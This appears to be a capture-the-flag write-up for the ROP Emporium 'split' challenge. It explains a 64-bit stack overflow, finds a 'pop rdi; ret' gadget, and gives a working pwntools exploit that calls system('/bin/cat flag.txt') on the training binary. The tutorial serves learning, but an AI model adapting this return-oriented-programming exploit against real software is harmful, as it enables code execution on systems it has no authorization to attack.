I"'\<p>The elements that allowed you to complete ret2win are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain</p>

<p>The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The binary can be downloaded from the authors website <a href="https://ropemporium.com">ropemporium</a>.</p>

<p>First we check the binary protections enabled. Only <strong>NX</strong> (Not executable) is enabled on the device according to <code class="language-plaintext highlighter-rouge">checksec</code> binary utility as shown in the image below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>vx@archie:split<span class="nv">$ </span>checksec <span class="nt">--file</span><span class="o">=</span><span class="nb">split
    </span>Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>For analysis of binary we use <code class="language-plaintext highlighter-rouge">gdb</code> to analyze the functions present in the binary in order to understand the logic. We disassemble <strong>pwnme</strong> function as shown in the image below.The function looks familiar as for the ret2win function.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">pwnme</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">pwnme</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x00000000004006e8</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x00000000004006e9</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rsp</span>
   <span class="err">0</span><span class="nf">x00000000004006ec</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x20</span>
   <span class="err">0</span><span class="nf">x00000000004006f0</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x00000000004006f4</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x20</span>
   <span class="err">0</span><span class="nf">x00000000004006f9</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">esi</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x00000000004006fe</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rax</span>
   <span class="err">0</span><span class="nf">x0000000000400701</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400580</span> <span class="o">&lt;</span><span class="nv">memset@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400706</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x400810</span>
   <span class="err">0</span><span class="nf">x000000000040070b</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400710</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x40083c</span>
   <span class="err">0</span><span class="nf">x0000000000400715</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x000000000040071a</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400570</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x000000000040071f</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x20</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x0000000000400723</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x60</span>
   <span class="err">0</span><span class="nf">x0000000000400728</span> <span class="o">&lt;+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="nb">rax</span>
   <span class="err">0</span><span class="nf">x000000000040072b</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x0000000000400730</span> <span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400590</span> <span class="o">&lt;</span><span class="nv">read@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400735</span> <span class="o">&lt;+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x40083f</span>
   <span class="err">0</span><span class="nf">x000000000040073a</span> <span class="o">&lt;+</span><span class="mi">82</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400550</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x000000000040073f</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">nop</span>
   <span class="err">0</span><span class="nf">x0000000000400740</span> <span class="o">&lt;+</span><span class="mi">88</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">leave</span>
   <span class="err">0</span><span class="nf">x0000000000400741</span> <span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.</p>

<p><img src="/assets/images/ropemporium/stack.png" alt="" /></p>

<p>Next function is <strong>read</strong> function, which reads for user input from the standard input file descriptor and stores in specified buffer. From disassembled code, we are reading <strong>0x60</strong> bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold, therefore leading to stack buffer overflow.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>For this challenge we don’t have a <code class="language-plaintext highlighter-rouge">ret2win</code> function which we are to return to. From the disassembly of the binary we have an interesting function called <strong>usefulFunction</strong> responsible for listing the files in the directory when called.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sas</span> <span class="nv">usefulFunction</span>
<span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">usefulFunction</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x0000000000400742</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x0000000000400743</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="nb">rsp</span>
   <span class="err">0</span><span class="nf">x0000000000400746</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="mh">0x40084a</span>
   <span class="err">0</span><span class="nf">x000000000040074b</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x400560</span> <span class="o">&lt;</span><span class="nv">system@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x0000000000400750</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">nop</span>
   <span class="err">0</span><span class="nf">x0000000000400751</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nb">rbp</span>
   <span class="err">0</span><span class="nf">x0000000000400752</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
<span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">x</span><span class="o">/</span><span class="nv">s</span> <span class="mh">0x40084a</span>
<span class="err">0</span><span class="nl">x40084a:</span>	<span class="err">"/</span><span class="nf">bin</span><span class="o">/</span><span class="nv">ls</span><span class="err">"</span>
<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Goal is to pass a different string to the <code class="language-plaintext highlighter-rouge">system</code> function instead of <strong>“/bin/ls”</strong></p>

<p>From the author’s hint, we can look for useful hints in the binary using either radare2.</p>

<blockquote>
  <p>Now that you’ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the <strong>“/bin/cat flag.txt”</strong> string as the only argument. You’ll also have to start dealing with the differences between the various architectures’ calling conventions.</p>
</blockquote>

<p>Analyzing binary using <code class="language-plaintext highlighter-rouge">radare2</code>, we can use <strong>iz</strong> command to look for strings. The goal is to read the flag from the system.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="err">[0</span><span class="nf">x004005b0</span><span class="p">]</span><span class="o">&gt;</span> <span class="nv">iz</span>
<span class="nf">nth</span> <span class="nv">paddr</span>      <span class="nv">vaddr</span>      <span class="nv">len</span> <span class="nb">si</span><span class="nv">ze</span> <span class="nv">section</span> <span class="nv">type</span>  <span class="nv">string</span>
<span class="err">---------------------------------------------------------------------------------------------</span>
<span class="err">0</span>   <span class="err">0</span><span class="nf">x000007e8</span> <span class="mh">0x004007e8</span> <span class="mi">21</span>  <span class="mi">22</span>   <span class="nv">.rodata</span> <span class="nv">ascii</span> <span class="nb">sp</span><span class="nv">lit</span> <span class="nv">by</span> <span class="nv">ROP</span> <span class="nv">Emporium</span>
<span class="err">1</span>   <span class="err">0</span><span class="nf">x000007fe</span> <span class="mh">0x004007fe</span> <span class="mi">7</span>   <span class="mi">8</span>    <span class="nv">.rodata</span> <span class="nv">ascii</span> <span class="nv">x86_64</span><span class="err">\</span><span class="nv">n</span>
<span class="err">2</span>   <span class="err">0</span><span class="nf">x00000806</span> <span class="mh">0x00400806</span> <span class="mi">8</span>   <span class="mi">9</span>    <span class="nv">.rodata</span> <span class="nv">ascii</span> <span class="err">\</span><span class="nv">nExiting</span>
<span class="err">3</span>   <span class="err">0</span><span class="nf">x00000810</span> <span class="mh">0x00400810</span> <span class="mi">43</span>  <span class="mi">44</span>   <span class="nv">.rodata</span> <span class="nv">ascii</span> <span class="nv">Contriving</span> <span class="nv">a</span> <span class="nv">reason</span> <span class="nv">to</span> <span class="nv">ask</span> <span class="nv">user</span> <span class="nv">for</span> <span class="nv">data...</span>
<span class="err">4</span>   <span class="err">0</span><span class="nf">x0000083f</span> <span class="mh">0x0040083f</span> <span class="mi">10</span>  <span class="mi">11</span>   <span class="nv">.rodata</span> <span class="nv">ascii</span> <span class="nv">Thank</span> <span class="nv">you</span><span class="err">!</span>
<span class="err">5</span>   <span class="err">0</span><span class="nf">x0000084a</span> <span class="mh">0x0040084a</span> <span class="mi">7</span>   <span class="mi">8</span>    <span class="nv">.rodata</span> <span class="nv">ascii</span> <span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">ls</span>
<span class="err">0</span>   <span class="err">0</span><span class="nf">x00001060</span> <span class="mh">0x00601060</span> <span class="mi">17</span>  <span class="mi">18</span>   <span class="nv">.data</span>   <span class="nv">ascii</span> <span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">cat</span> <span class="nv">flag.txt</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>We have an important string <strong>“/bin/cat flag.txt”</strong> which will enable us to complete our goal. Now we need pass string to system function as follows <strong>system(‘/bin/cat flag.txt’)</strong>.</p>

<p>For building ropchain, we need to understand the calling conventions of <strong>AMD64 ABI</strong>.The calling convention passes the arguments to the registers in the following order <strong>RDI, RSI, RDX, RCX, R8 and R9</strong>.</p>

<p>Because the system function receives one argument, we need to look for one gadget t that we control <strong>rdi</strong> address.</p>

<p><strong>What are gadgets?</strong></p>

<p>Gadgets are sequence of instructions that end with <code class="language-plaintext highlighter-rouge">ret</code> instruction. Because we want to load a value into rdi register, we look for a pop <strong>pop rdi; ret</strong> instruction in order to pass an argument to <code class="language-plaintext highlighter-rouge">system</code>.</p>

<p>For searching gadget in radare2/rizin, use <strong>/R</strong> command as shown in the image below.</p>

<p><img src="/assets/images/ropemporium/split_poprdi.png" alt="" />
Now we need to chain ropchain exploit as shown in the image below.</p>

<p><img src="/assets/images/ropemporium/popgadget.png" alt="ropchain" /></p>

<p>The goal is to overwrite the return address with the address of <strong>“pop rdi, ret “</strong> and call system function. we need to fill the buffer memory with 32bytes, 8 bytes to overwrite the <code class="language-plaintext highlighter-rouge">rbp</code> address and 8 bytes to overwrite return address with pop rdi address.</p>

<p>Full exploit of split challenge is;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s">"latin-1"</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">warnings</span><span class="p">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">"./split"</span><span class="p">)</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400560</span><span class="p">)</span>   <span class="c1">#address of system
</span><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x004007c3</span><span class="p">)</span>  <span class="c1"># pop rdi; ret gadget
</span><span class="n">bin_cat_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00601060</span><span class="p">)</span>  <span class="c1">#bin cat flag.txt address
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">32</span>  <span class="c1">#fill the buffer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span><span class="mi">8</span>   <span class="c1"># overwrite  rbp
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="c1"># pop rdi gadget
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">bin_cat_addr</span> <span class="c1"># argument passed to the system function
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">system_addr</span>   <span class="c1">#call system
</span>
<span class="n">io</span><span class="p">.</span><span class="n">writeafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">clean</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running python3 code we get a flag.</p>

<p><img src="/assets/images/ropemporium/split_flag.png" alt="" /></p>

<blockquote>
  <p><strong>To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.</strong></p>
</blockquote>
:ET